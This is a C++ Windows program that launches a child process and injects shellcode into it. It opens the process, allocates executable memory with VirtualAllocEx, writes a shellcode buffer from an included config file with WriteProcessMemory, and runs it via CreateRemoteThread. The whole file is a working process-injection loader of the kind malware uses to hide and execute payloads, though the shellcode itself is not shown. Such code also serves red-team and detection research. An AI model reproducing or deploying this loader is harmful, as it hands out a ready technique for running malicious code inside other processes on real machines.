#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#include "config file.cpp"


int _tmain( int argc, TCHAR *argv[] )

{

//standard windows api to start process

    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    DWORD dwProcessId = 0;
	DWORD dwTechnique = 0;

    ZeroMemory( &si, sizeof(si) );
    si.cb = sizeof(si);
    ZeroMemory( &pi, sizeof(pi) );

    if( argc != 1 )
    {
        printf("please recheck the\n", argv[0]);
        return 0;
    }

    // Start the child process. 
    if( !CreateProcess( NULL,   // No module name (use command line)
        command_exe,        // Command line
        NULL,           // Process handle not inheritable
        NULL,           // Thread handle not inheritable
        FALSE,          // Set handle inheritance to FALSE
        0,              // No creation flags
        NULL,           // Use parent's environment block
        NULL,           // Use parent's starting directory 
        &si,            // Pointer to STARTUPINFO structure
        &pi )           // Pointer to PROCESS_INFORMATION structure
    ) 
    {
        printf( "CreateProcess failed (%d).\n", GetLastError() );
        return 0;
    }
    else
    {
        
        wprintf((L" PID (%d).\n"), pi.dwProcessId);
    }

    dwProcessId= pi.dwProcessId;

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
	if (hProcess == NULL)
	{
		//printf("[-] Couldn't open process, exiting...\n");
		//return -1;
		wprintf((L"OpenProcess"));
	}


    //allocate memory in target process
	LPVOID lpBaseAddress = (LPVOID)VirtualAllocEx(hProcess, NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (lpBaseAddress == NULL)
	{
		wprintf((L"VirtualAllocEx"));
	}
	printf("[+] Allocated memory address in target process is: 0x%Ix\n", (SIZE_T)lpBaseAddress);

    //write SC to target process
	SIZE_T *lpNumberOfBytesWritten = 0;
	BOOL resWPM = WriteProcessMemory(hProcess, lpBaseAddress, (LPVOID)sc, sizeof(sc), lpNumberOfBytesWritten);
	if (!resWPM)
	{
		wprintf((L"WriteProcessMemory"));
	}
	printf("[+] Shellcode is written to memory of target process\n");

    HANDLE hThread = NULL;
	DWORD ThreadId = 0;

    switch(t_no)
    {
        case 1:
        {

    hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpBaseAddress, NULL, 0, (LPDWORD)(&ThreadId));
		if (hThread == NULL)
		{
			wprintf((L"CreateRemoteThread"));
		}

        }
        
        }

	//start remote thread in target process
    // Wait until child process exits.
    WaitForSingleObject( pi.hProcess, INFINITE );

    // Close process and thread handles. 
    CloseHandle( pi.hProcess );
    CloseHandle( pi.hThread );
       
    return 0;
}